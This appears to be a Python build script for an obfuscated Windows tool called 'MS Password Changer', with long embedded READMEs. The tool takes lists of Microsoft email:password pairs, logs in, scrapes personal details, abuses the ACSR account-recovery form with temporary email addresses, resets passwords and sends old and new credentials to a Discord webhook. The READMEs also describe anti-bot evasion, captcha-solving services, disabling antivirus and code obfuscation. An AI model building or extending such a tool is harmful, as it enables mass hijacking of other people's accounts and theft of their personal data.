"""
ADVANCED EXE BUILDER - MS Password Changer
- Self-contained executable with all dependencies
- Obfuscated and protected against reverse engineering
- Auto-installs requirements on first run
- Professional packaging
"""

import os
import shutil
import subprocess
import sys
import site
import json
from datetime import datetime

MAIN_FILE = "run.py"
ROOT_MODULES = ["tempmail.py", "main.py"]
FOLDERS = ["gui", "utils", "automation"]
APP_NAME = "MSPasswordChanger"
VERSION = "1.0.0"

def step(msg):
    print(f"\n{'='*70}\n{msg}\n{'='*70}")

def check_python_version():

    version = sys.version_info
    if version.major < 3 or (version.major == 3 and version.minor < 8):
        print("❌ Python 3.8+ required")
        sys.exit(1)
    print(f"✅ Python {version.major}.{version.minor}.{version.micro}")

def install_deps():
    step("📦 Installing dependencies...")
    
    
    subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pip"], check=True)
    
    
    subprocess.run([sys.executable, "-m", "pip", "install", "-r", "requirements.txt"], check=True)
    
    
    subprocess.run([sys.executable, "-m", "pip", "install", "pyarmor", "pyinstaller>=6.0"], check=True)
    
    print("✅ All dependencies installed")

def ensure_packages():
    step("📁 Ensuring package structure...")
    for folder in FOLDERS:
        if not os.path.exists(folder):
            continue
        for root, dirs, files in os.walk(folder):
            init = os.path.join(root, "__init__.py")
            if not os.path.exists(init):
                open(init, "w").close()
                print(f"  ✅ Created {init}")

def clean():
    step("🧹 Cleaning old builds...")
    dirs_to_clean = ["build", "dist", "dist_obfuscated", "Release", "__pycache__"]
    for d in dirs_to_clean:
        if os.path.exists(d):
            shutil.rmtree(d, ignore_errors=True)
            print(f"  🗑️  Removed {d}")
    
    
    for f in os.listdir('.'):
        if f.endswith('.spec') or (f.startswith('hook-') and f.endswith('.py')):
            try: 
                os.remove(f)
                print(f"  🗑️  Removed {f}")
            except: 
                pass

def create_pyinstaller_hooks():
    step("🛠️  Creating PyInstaller hooks...")
    
    
    for pkg in FOLDERS:
        hook_content = f"""from PyInstaller.utils.hooks import collect_submodules, collect_data_files

hiddenimports = collect_submodules('{pkg}')
datas = collect_data_files('{pkg}', include_py_files=True)
"""
        with open(f"hook-{pkg}.py", "w") as f:
            f.write(hook_content)
        print(f"  ✅ Created hook-{pkg}.py")

def obfuscate_code():
    step("🔒 Obfuscating code with PyArmor...")
    out = "dist_obfuscated"
    os.makedirs(out, exist_ok=True)

    
    items = [MAIN_FILE, "main.py"] + FOLDERS
    for item in items:
        if os.path.exists(item):
            try:
                subprocess.run(
                    ["pyarmor", "gen", "--output", out, "--recursive", item],
                    check=True,
                    capture_output=True
                )
                print(f"  🔐 {item}")
            except subprocess.CalledProcessError as e:
                print(f"  ⚠️  Failed to obfuscate {item}: {e}")

    
    for module in ROOT_MODULES:
        if os.path.exists(module) and module not in [MAIN_FILE, "main.py"]:
            try:
                subprocess.run(
                    ["pyarmor", "gen", "--output", out, module],
                    check=True,
                    capture_output=True
                )
                print(f"  🔐 {module}")
            except:
                pass

    
    if os.path.exists("config.json"):
        shutil.copy("config.json", out)
        print("  📄 config.json copied")

    print("✅ Obfuscation complete")
    return out

def build_exe(obf_dir):
    step("⚙️  Building EXE with PyInstaller...")
    
    entry_point = os.path.join(obf_dir, MAIN_FILE)
    sep = os.pathsep

    
    hidden = [
        
        "customtkinter", "PIL", "PIL._tkinter_finder", "PIL.Image", "PIL.ImageTk",
        "tkinter", "tkinter.filedialog", "tkinter.messagebox",
        
        
        "gui", "gui.auth_screen", "gui.main_window", "gui.processing_screen", "gui.styles",
        "automation", "automation.core", "automation.acsr", "automation.acsr_continue",
        "automation.driver", "automation.reset_password", "automation.tempmail",
        "automation.logger", "automation.captcha",
        "utils", "utils.api_client", "utils.password_generator", "utils.session_manager",
        "tempmail",
        
        
        "selenium", "selenium.webdriver", "selenium.webdriver.common",
        "selenium.webdriver.common.by", "selenium.webdriver.common.keys",
        "selenium.webdriver.support", "selenium.webdriver.support.ui",
        "selenium.webdriver.support.expected_conditions",
        "selenium.webdriver.chrome", "selenium.webdriver.chrome.service",
        "selenium.webdriver.chrome.options",
        "selenium.common", "selenium.common.exceptions",
        
        
        "requests", "json", "time", "threading", "pycountry",
        "webdriver_manager", "webdriver_manager.chrome",
        "aiohttp", "discord", "flask"
    ]

    
    cmd = [
        "pyinstaller",
        "--onefile",
        "--noconsole",
        "--name", APP_NAME,
        "--clean",
        "--noconfirm",
        "--additional-hooks-dir=.",
        "--log-level", "WARN",
    ]

    
    if os.path.exists("icon.ico"):
        cmd.extend(["--icon", "icon.ico"])

    
    if sys.platform == "win32":
        cmd.extend([
            "--version-file", "version_info.txt"
        ]) if os.path.exists("version_info.txt") else None

    
    if os.path.exists(f"{obf_dir}{os.sep}config.json"):
        cmd.extend(["--add-data", f"{obf_dir}{os.sep}config.json{sep}."])

    
    for module in ROOT_MODULES:
        src_path = os.path.join(obf_dir, module)
        if os.path.exists(src_path):
            cmd.extend(["--add-data", f"{src_path}{sep}."])
    
    for h in hidden:
        cmd.extend(["--hidden-import", h])

    
    runtime_hook = """
import sys
import os


import warnings
warnings.filterwarnings('ignore')


if hasattr(sys, '_MEIPASS'):
    os.environ['PATH'] = sys._MEIPASS + os.pathsep + os.environ.get('PATH', '')
"""
    
    with open("runtime_hook.py", "w") as f:
        f.write(runtime_hook)
    
    cmd.extend(["--runtime-hook", "runtime_hook.py"])

    cmd.append(entry_point)

    
    print("  🔨 Running PyInstaller (this may take a few minutes)...")
    try:
        subprocess.run(cmd, check=True)
        print("✅ EXE built successfully")
    except subprocess.CalledProcessError as e:
        print(f"❌ PyInstaller failed: {e}")
        raise

def create_readme_exe():

    readme = """╔════════════════════════════════════════════════════════════════════╗
║                MS ACCOUNT PASSWORD CHANGER v1.0                    ║
║                        EXE EDITION                                 ║
╚════════════════════════════════════════════════════════════════════╝

📦 WHAT'S INCLUDED
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✓ MSPasswordChanger.exe - Main application (self-contained)
✓ README.txt - This file

🚀 QUICK START GUIDE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. Double-click MSPasswordChanger.exe
2. Enter your Discord User ID (must be authorized by Steve)
3. Check Discord DMs for OTP code
4. Enter OTP to authenticate
5. Add Microsoft accounts (single or bulk upload)
6. Click "Start Processing"

💡 SYSTEM REQUIREMENTS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✓ Windows 10 or later (64-bit)
✓ Google Chrome installed (latest version)
✓ Active internet connection
✓ Discord account (authorized by Steve)
✓ 4GB RAM minimum, 8GB recommended
✓ Screen resolution: 1280x720 or higher

📋 HOW TO USE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

AUTHENTICATION:
---------------
1. Launch the application
2. Enter your Discord User ID (18-digit number)
   Example: 793101872784867352
3. Click "Continue"
4. Check your Discord DMs for 6-digit OTP
5. Enter OTP within 5 minutes (3 attempts max)
6. Session is saved - no need to login next time!

ADDING ACCOUNTS:
----------------
Option 1: Single Account
  • Click "Add Single Account"
  • Enter in format: email@example.com:password123
  • Click "Add Account"

Option 2: Bulk Upload (Recommended for multiple accounts)
  • Create a .txt file with one account per line
  • Format: email@example.com:password123
  • Click "Upload from txt"
  • Select your file

AUTO PASSWORD:
--------------
☑ Checked (Default): Auto-generates passwords
  Format: ShulkerGen123456 (6 random digits)

☐ Unchecked: Manual password entry
  You'll be prompted for each account

PROCESSING:
-----------
1. Click "Start Processing"
2. Watch real-time logs
3. Solve CAPTCHA when prompted (appears on right side)
4. Wait for completion
5. Check Discord webhook for results
6. Click "Back to Main Screen" to process more

🔐 NORMAL WORKFLOW
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
The tool automatically:
1. Logs into each Microsoft account
2. Scrapes account information (name, DOB, region, Skype, Xbox)
3. Submits ACSR (Account Support Recovery) form
4. Solves CAPTCHA (you help with this)
5. Retrieves OTP from temporary email
6. Gets password reset link
7. Resets the password
8. Sends results to Discord webhook

🚨 CRITICAL: PASSKEY/WINDOWS HELLO POPUP
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Some accounts trigger: "Choose a passkey" or "Windows Hello" popup

⚠️  ACTION REQUIRED:
    👉 Click "CANCEL" immediately when this popup appears!
    👉 DO NOT click "X" or choose a passkey
    👉 Clicking Cancel lets the bot continue with password reset

If you don't cancel:
❌ Program gets stuck on that account
❌ You'll need to restart the tool

⚙️ COMMON ISSUES & SOLUTIONS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

"Chrome not found"
➜ Install Chrome: https://www.google.com/chrome/
➜ Restart the application

"Not authorized"
➜ Contact Steve on Discord (752512794624262146)
➜ Provide your Discord User ID for authorization

"OTP doesn't arrive"
➜ Check Discord DMs (may be in Message Requests)
➜ Verify you're authorized by Steve
➜ OTP expires after 5 minutes
➜ Try "Request OTP" again

"Cannot connect to server"
➜ Check internet connection
➜ Server may be temporarily down
➜ Try again in a few minutes
➜ Contact Steve if issue persists

"CAPTCHA failed multiple times"
➜ Type characters carefully (case-sensitive)
➜ If image is unclear, click Submit for new CAPTCHA
➜ Maximum 3 retries per account

"Reset link was not found"
➜ Account may be flagged by Microsoft
➜ Try another account
➜ If 10+ accounts fail in a row, contact Steve

"Password was rejected"
➜ Tool automatically retries with fallback: ShulkerCorePass!12
➜ This is normal for some accounts

"Processing is slow"
➜ Normal - each account takes 2-3 minutes
➜ Don't close the application
➜ Be patient during CAPTCHA and login steps

Application crashes or freezes
➜ Restart the application
➜ Session is saved - just login again
➜ Previous successful accounts are logged
➜ Check logs in application folder

🎯 BEST PRACTICES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✓ Process 5-10 accounts per batch for best results
✓ Always click "Cancel" on passkey popup (not X)
✓ Keep Chrome updated to latest version
✓ Use on a secure, trusted computer only
✓ Don't run multiple instances simultaneously
✓ Wait at least 5 minutes before retrying failed accounts
✓ Keep the application window in focus during processing
✓ Monitor logs for any error messages

📊 UNDERSTANDING RESULTS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Success Messages:
✅ "Password changed successfully" - Account processed
✅ Check Discord webhook for new credentials
✅ Old and new passwords are logged

Failure Messages:
❌ "Incorrect password" - Wrong login credentials
❌ "Could Not Login" - Account issue or blocked
❌ "Reset link was not found" - ACSR failed
❌ "OTP not received" - Temporary email issue

🔒 SECURITY & DATA
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✓ All data is processed locally on your machine
✓ Results sent only to configured Discord webhook
✓ Session saved in: user_session.json
✓ CAPTCHA images temporarily saved and deleted
✓ No data stored on external servers
✓ Code is obfuscated for security

📁 FILE LOCATIONS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
MSPasswordChanger.exe - Main executable
user_session.json - Saved login session (auto-created)
captcha_*.png - Temporary CAPTCHA images (auto-deleted)

🆘 TROUBLESHOOTING STEPS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. Close the application completely
2. Delete user_session.json if it exists
3. Restart your computer
4. Make sure Chrome is updated
5. Run as Administrator (right-click > Run as administrator)
6. Disable antivirus temporarily (may block browser automation)
7. Check Windows Defender hasn't quarantined files
8. Contact Steve with error screenshots

📞 SUPPORT & AUTHORIZATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
For authorization, bugs, or bulk processing needs:

Contact: Steve
Discord ID: 752512794624867352
Server: http://212.132.120.102:14307

Provide the following when reporting issues:
• Your Discord User ID
• Error message (screenshot preferred)
• Account format you're using
• Number of accounts processed before error
• Windows version

⚖️ LICENSE & TERMS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✓ Licensed for authorized users only
✓ Do not share, distribute, or resell
✓ Tool provided "as-is" without warranty
✓ Use responsibly and legally
✓ Respect Microsoft Terms of Service
✓ Obfuscated code - reverse engineering prohibited

💡 PRO TIPS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• Save your account list as backup.txt before processing
• Use Auto Password for faster processing
• Close other Chrome windows during processing
• Keep Discord open to receive OTPs quickly
• Process during off-peak hours for better success rate
• Document which accounts succeed/fail for tracking

📝 VERSION HISTORY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
v1.0.0 - Initial Release
• Discord authentication with OTP
• Auto password generation
• Bulk account processing
• CAPTCHA solving interface
• Real-time logging
• Discord webhook integration
• Session management

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Tool by Steve | Protected Code | Authorized Use Only
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
    return readme

def create_readme_source():
    """Create README for source code distribution"""
    readme = """╔════════════════════════════════════════════════════════════════════╗
║            MS ACCOUNT PASSWORD CHANGER v1.0                        ║
║                   SOURCE CODE EDITION                              ║
╚════════════════════════════════════════════════════════════════════╝

📦 PROJECT STRUCTURE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
MS-Password-Changer/
│
├── 📄 main.py                    
├── 📄 run.py                     
├── 📄 tempmail.py                
├── 📄 config.json                
├── 📄 requirements.txt           
├── 📄 advanced_exe_builder.py   
├── 📄 README_SOURCE.txt          
│
├── 📁 gui/                       
│   ├── __init__.py
│   ├── auth_screen.py           
│   ├── main_window.py           
│   ├── processing_screen.py    
│   └── styles.py                
│
├── 📁 automation/                
│   ├── __init__.py
│   ├── core.py                  
│   ├── acsr.py                  
│   ├── acsr_continue.py         
│   ├── driver.py                
│   ├── reset_password.py        
│   ├── captcha.py               
│   └── logger.py                
│
└── 📁 utils/                     
    ├── __init__.py
    ├── api_client.py            
    ├── password_generator.py   
    └── session_manager.py       

🚀 INSTALLATION & SETUP
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

PREREQUISITES:
--------------
✓ Python 3.8 or higher
✓ pip (Python package manager)
✓ Google Chrome browser (latest)
✓ Git (optional, for cloning)

STEP 1: Install Python Dependencies
------------------------------------
Open terminal/command prompt in project folder:

    pip install -r requirements.txt

This installs:
• discord.py - Discord bot integration
• Flask - Web server for authentication
• requests - HTTP client
• customtkinter - Modern GUI framework
• Pillow - Image processing
• selenium - Browser automation
• undetected-chromedriver - Anti-detection driver
• aiohttp - Async HTTP

STEP 2: Configure config.json
------------------------------
Edit config.json with your settings:

{
    "webhook_url": "YOUR_DISCORD_WEBHOOK_URL",
    "flask_server": "http://YOUR_SERVER:PORT",
    "steve_user_id": "YOUR_DISCORD_USER_ID"
}

• webhook_url: Where successful results are sent
• flask_server: Authentication server endpoint
• steve_user_id: Admin Discord ID

STEP 3: Run the Application
----------------------------
    python run.py

Or directly:
    python main.py

🏗️ ARCHITECTURE OVERVIEW
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

APPLICATION FLOW:
-----------------
1. run.py (Launcher)
   ↓ Pre-flight checks (Chrome, certificates)
   ↓ Dynamic import of main.py
   
2. main.py (Entry Point)
   ↓ Initialize CustomTkinter app
   ↓ Check saved session
   
3. auth_screen.py (Authentication)
   ↓ Discord ID input
   ↓ API authorization check
   ↓ OTP verification
   ↓ Save session
   
4. main_window.py (Main Interface)
   ↓ Account management (add/upload/remove)
   ↓ Auto password toggle
   ↓ Start processing button
   
5. processing_screen.py (Processing)
   ↓ For each account:
       ├── core.py: Scrape account info
       ├── acsr.py: Submit ACSR form
       ├── captcha.py: Download CAPTCHA
       ├── User solves CAPTCHA
       ├── acsr_continue.py: Complete ACSR
       ├── reset_password.py: Reset password
       └── logger.py: Send to webhook

📋 MODULE DESCRIPTIONS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

ENTRY POINTS:
-------------
run.py:
  • Smart launcher with environment checks
  • Verifies Chrome installation
  • Handles PyInstaller frozen state
  • Dynamic module import for obfuscation compatibility

main.py:
  • Main application class (MSPasswordChangerApp)
  • Window configuration and centering
  • Session restoration on startup
  • Screen navigation management

GUI MODULES (gui/):
-------------------
auth_screen.py:
  • Discord User ID input form
  • Authorization check via API client
  • OTP request and verification
  • Session saving after authentication
  • Not authorized error screen
  • 3 OTP attempt limit with lockout

main_window.py:
  • Account list management (add/remove/clear)
  • Single account dialog with validation
  • Bulk upload from txt file
  • Auto password checkbox toggle
  • Scrollable account display
  • Logout with session clearing
  • Processing initiation

processing_screen.py:
  • Real-time log display (CTkTextbox)
  • CAPTCHA image display with PIL
  • CAPTCHA input and submission
  • Progress tracking (current/total)
  • Success/failure counters
  • Threaded account processing
  • Password prompt dialog (if auto-off)
  • CAPTCHA retry handling (max 3)
  • Webhook notification on completion
  • Back to main button

styles.py:
  • Color scheme (purple/blue/teal gradient)
  • Font definitions (title, heading, body)
  • Button styles (primary, success, danger)
  • Entry field styles
  • Frame styles with borders
  • Window dimensions

AUTOMATION MODULES (automation/):
----------------------------------
core.py:
  • scrape_account_info(email, password)
  • Logs into Microsoft account
  • Handles multiple login flows:
    - Direct password input
    - "Use your password" button
    - "Other ways to sign in" button
    - Legacy credential picker
  • Detects incorrect password
  • Handles rate limiting (retries)
  • Closes security prompts
  • Scrapes Microsoft profile:
    - Full name
    - Date of birth
    - Country/Region
  • Scrapes Skype profile:
    - Skype ID
    - Skype email
  • Scrapes Xbox profile:
    - Gamertag extraction from URL
  • Returns dict with all account info

acsr.py:
  • submit_acsr_form(account_info)
  • Generates temporary email via tempmail.py
  • Configures proxy (optional, currently disabled)
  • Opens Microsoft ACSR page
  • Fills account email
  • Fills recovery email (tempmail)
  • Downloads CAPTCHA image
  • Returns: captcha_image, driver, token, tempmail

acsr_continue.py:
  • continue_acsr_flow(driver, account_info, token, captcha_text, user_id)
  • Submits CAPTCHA solution
  • Handles CAPTCHA retry on failure
  • Waits for OTP via tempmail
  • Submits OTP code
  • Fills personal information:
    - First and last name parsing
    - DOB dropdown selection (month/day/year)
    - Country/Region
  • Enters old password
  • Selects product options (Skype, Xbox)
  • Fills Skype information
  • Selects Xbox One platform
  • Enters Xbox Gamertag
  • Waits for reset email (2nd email)
  • Extracts password reset link
  • Returns reset link or error code

driver.py:
  • create_driver(headless, use_proxy, proxy_config)
  • Creates Chrome WebDriver with selenium-wire
  • Configures headless/headed mode
  • Sets up proxy authentication (if enabled)
  • Anti-detection measures:
    - Disables automation flags
    - Custom user agent (Linux/Windows)
    - WebDriver property masking
    - Plugin spoofing
  • Finds Chrome binary in common locations
  • Handles WebDriver Manager installation
  • Returns configured driver instance

reset_password.py:
  • perform_password_reset(resetlink, email, new_password)
  • Opens password reset link
  • Enters account email
  • Fills new password (twice)
  • Submits form
  • Handles password rejection:
    - Automatically retries with fallback
    - Fallback: "ShulkerCorePass!12"
  • Returns actual password used
  • Takes screenshot on failure

captcha.py:
  • download_captcha(driver)
  • Finds CAPTCHA image element (GetHIPData)
  • Downloads image from source URL
  • Converts to PNG via PIL
  • Returns BytesIO buffer

logger.py:
  • send_webhook(results, webhook_url)
  • Formats successful account results
  • Sends to Discord webhook
  • Includes all account details:
    - Email, old/new passwords
    - Name, DOB, region
    - Skype ID/email
    - Xbox Gamertag

UTILITY MODULES (utils/):
--------------------------
api_client.py:
  • APIClient class for Flask server communication
  • check_authorization(user_id):
    - POST /check_auth
    - Returns (authorized: bool, message: str)
  • request_otp(user_id):
    - POST /request_otp
    - Triggers Discord DM with OTP
    - Returns (success: bool, message: str)
  • verify_otp(user_id, otp):
    - POST /verify_otp
    - Validates 6-digit code
    - Returns (success: bool, message: str)
  • health_check():
    - GET /health
    - Server connectivity test
  • 5 second timeout on all requests
  • Handles ConnectionError, Timeout exceptions

password_generator.py:
  • generate_shulker_password():
    - Format: ShulkerGen
    - Returns string with 6 random digits
    - Example: "ShulkerGen847392"
  • generate_custom_password(prefix, length):
    - Customizable prefix and digit count
    - Default: same as above

session_manager.py:
  • save_session(user_id):
    - Writes user_session.json
    - Stores Discord User ID
  • load_session():
    - Reads user_session.json
    - Returns user_id or None
  • clear_session():
    - Deletes user_session.json
    - Called on logout
  • has_saved_session():
    - Checks if session file exists
    - Used for auto-login

EXTERNAL SERVICES:
------------------
tempmail.py:
  • Mail.tm API integration (https://api.mail.tm)
  • generate_temp_mail_account():
    - Creates random username@domain
    - Registers account
    - Gets authentication token
    - Returns: email, password, token
  • wait_for_emails(token, count, timeout):
    - Polls for new emails
    - Returns list of messages
  • get_otp_from_first_email(token):
    - Reads first email
    - Extracts 6-digit OTP with regex
    - Returns OTP string
  • extract_specific_link(text):
    - Parses email for reset link
    - Looks for "Click this link to reset"
    - Returns URL from next line

🔧 CUSTOMIZATION GUIDE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

CHANGE PASSWORD FORMAT:
------------------------
Edit utils/password_generator.py:

def generate_shulker_password() -> str:
    
    random_numbers = ''.join([str(random.randint(0, 9)) for _ in range(8)])
    return f"MyPrefix{random_numbers}"

CHANGE UI COLORS:
-----------------
Edit gui/styles.py:

COLORS = {
    "accent_purple": "
    "bg_dark": "
    
}

CHANGE SERVER ENDPOINT:
-----------------------
Edit config.json:

{
    "flask_server": "http://your-domain.com:port"
}

Or edit utils/api_client.py default:

def __init__(self, base_url: str = "http://your-server:port"):

ADD PROXY SUPPORT:
------------------
Edit automation/acsr.py, line ~26:

proxy_config = {
    'host': 'your.proxy.host',
    'port': 'port',
    'username': 'user',
    'password': 'pass'
}

driver = create_driver(headless=True, use_proxy=True, proxy_config=proxy_config)

DISABLE HEADLESS MODE (for debugging):
---------------------------------------
Edit any automation module call:

driver = create_driver(headless=False)

CHANGE WEBHOOK FORMAT:
----------------------
Edit automation/logger.py, send_webhook():


content = "Your custom format with {result['email']}"

🛠️ BUILDING THE EXE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

USING PROVIDED BUILDER:
-----------------------
    python advanced_exe_builder.py

This will:
1. Check Python version (3.8+ required)
2. Install all dependencies
3. Ensure package structure
4. Clean old builds
5. Obfuscate code with PyArmor
6. Create PyInstaller hooks
7. Build single-file EXE
8. Package with README files
9. Output to Release/ folder

MANUAL BUILD (if needed):
-------------------------
1. Install dependencies:
   pip install pyarmor pyinstaller>=6.0

2. Obfuscate code:
   pyarmor gen --output dist_obfuscated --recursive gui
   pyarmor gen --output dist_obfuscated --recursive automation
   pyarmor gen --output dist_obfuscated --recursive utils
   pyarmor gen --output dist_obfuscated run.py main.py tempmail.py

3. Build EXE:
   pyinstaller --onefile --noconsole --name MSPasswordChanger \
   --add-data "config.json;." \
   --hidden-import gui --hidden-import automation --hidden-import utils \
   dist_obfuscated/run.py

4. Copy config.json to dist/

OUTPUT FILES:
-------------
Release/
├── MSPasswordChanger.exe    
├── README_EXE.txt           
└── README_SOURCE.txt        

🐛 DEBUGGING & TROUBLESHOOTING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

COMMON ISSUES:
--------------

1. "ModuleNotFoundError: No module named 'X'"
   → pip install -r requirements.txt
   → Make sure all __init__.py files exist

2. "Chrome not found"
   → Install Chrome: https://www.google.com/chrome/
   → Or update chrome_paths in automation/driver.py

3. "Cannot connect to server"
   → Check config.json flask_server URL
   → Ensure Flask server is running
   → Test with: python -c "from utils.api_client import APIClient; print(APIClient().health_check())"

4. "CAPTCHA not displaying"
   → Check PIL installation: pip install Pillow
   → Ensure captcha_*.png files are being created

5. "PyArmor obfuscation failed"
   → Update PyArmor: pip install --upgrade pyarmor
   → Try without obfuscation (comment out obfuscate_code())

6. "PyInstaller EXE doesn't run"
   → Test with --console flag first to see errors
   → Check Windows Defender didn't quarantine
   → Run as Administrator

ENABLE DEBUG LOGGING:
---------------------
Add to top of any module:

import logging
logging.basicConfig(level=logging.DEBUG)

VIEW CHROME BROWSER:
--------------------
Change headless=True to headless=False in:
• automation/core.py
• automation/acsr.py
• automation/reset_password.py

TEST INDIVIDUAL MODULES:
------------------------

python utils/password_generator.py


python tempmail.py


python utils/api_client.py


python -c "from automation.core import scrape_account_info; print(scrape_account_info('email@example.com', 'password'))"

📊 UNDERSTANDING THE WORKFLOW
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

COMPLETE PROCESS FOR ONE ACCOUNT:
----------------------------------
1. User adds: user@outlook.com:OldPass123

2. core.scrape_account_info():
   • Opens login.live.com
   • Enters email, clicks Next
   • Handles passkey/password choice
   • Enters password, clicks Sign In
   • Handles "Stay signed in?" prompt
   • Goes to account.microsoft.com/profile
   • Extracts: Name, DOB, Country
   • Goes to secure.skype.com/portal/profile
   • Extracts: Skype ID, Skype Email
   • Goes to xbox.com/en-IN/play/user
   • Extracts: Xbox Gamertag from URL
   • Returns: {email, password, name, dob, region, skype_id, skype_email, gamertag}

3. acsr.submit_acsr_form():
   • Generates tempmail: randomuser@mail.tm
   • Opens account.live.com/acsr
   • Fills Microsoft email
   • Fills tempmail as recovery email
   • Downloads CAPTCHA image
   • Returns: captcha_image, driver, token, tempmail

4. User solves CAPTCHA in GUI

5. acsr_continue.continue_acsr_flow():
   • Submits CAPTCHA solution
   • If wrong: downloads new CAPTCHA, returns "CAPTCHA_RETRY_NEEDED"
   • If correct: continues...
   • Waits for OTP in tempmail inbox
   • Reads first email, extracts 6-digit OTP
   • Submits OTP
   • Fills first/last name
   • Selects DOB dropdowns (month, day, year)
   • Fills country
   • Enters old password
   • Checks Skype checkbox
   • Checks Xbox checkbox
   • Fills Skype ID and email
   • Selects Xbox One radio button
   • Enters Xbox Gamertag
   • Waits for 2nd email (reset link)
   • Extracts password reset URL
   • Returns: reset_link

6. reset_password.perform_password_reset():
   • Opens reset_link
   • Enters email again
   • Fills new password (ShulkerGen123456)
   • Fills confirm password
   • Submits form
   • If rejected: retries with ShulkerCorePass!12
   • Returns: actual_password_used

7. logger.send_webhook():
   • Formats result with all account info
   • Posts to Discord webhook
   • User receives notification with new credentials

⚙️ ADVANCED CONFIGURATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

MULTI-THREADING:
----------------
Currently processes accounts sequentially. To parallelize:

In processing_screen.py, modify process_accounts():

from concurrent.futures import ThreadPoolExecutor

def process_accounts(self):
    with ThreadPoolExecutor(max_workers=3) as executor:
        executor.map(self.process_single_account, self.accounts)

Note: CAPTCHA solving is still manual, so limited benefit.

RETRY LOGIC:
------------
Add retry decorator to automation functions:

from functools import wraps
import time

def retry(max_attempts=3, delay=5):
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            for attempt in range(max_attempts):
                try:
                    return func(*args, **kwargs)
                except Exception as e:
                    if attempt == max_attempts - 1:
                        raise
                    time.sleep(delay)
            return wrapper
        return decorator

@retry(max_attempts=3, delay=10)
def scrape_account_info(email, password):
    

DATABASE STORAGE:
-----------------
Instead of immediate webhook, store results in SQLite:

import sqlite3

def store_result(account_info):
    conn = sqlite3.connect('results.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS accounts
                 (email TEXT, old_pass TEXT, new_pass TEXT, ...)''')
    c.execute("INSERT INTO accounts VALUES (?, ?, ?, ...)",
              (account_info['email'], account_info['old_password'], ...))
    conn.commit()
    conn.close()

CAPTCHA AUTO-SOLVE:
-------------------
Integrate 2Captcha or AntiCaptcha API:


import requests

def solve_captcha_api(image_base64, api_key):
    
    response = requests.post(
        "https://2captcha.com/in.php",
        data={
            "key": api_key,
            "method": "base64",
            "body": image_base64
        }
    )
    captcha_id = response.json()['request']
    
    
    
    return solution

🔐 SECURITY BEST PRACTICES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

FOR SOURCE CODE DISTRIBUTION:
------------------------------
✓ Always obfuscate before distributing
✓ Don't include your personal config.json
✓ Provide template config with placeholders
✓ Use environment variables for sensitive data
✓ Add license agreement
✓ Watermark/fingerprint each distribution

FOR EXE DISTRIBUTION:
---------------------
✓ Use PyArmor obfuscation (included in builder)
✓ Sign EXE with code signing certificate
✓ Distribute only to authorized users
✓ Implement license key validation
✓ Add HWID binding for single-device use
✓ Use encrypted config

PROTECTING CREDENTIALS:
-----------------------
Never hardcode:
• Discord tokens
• Webhook URLs (or encrypt them)
• API keys
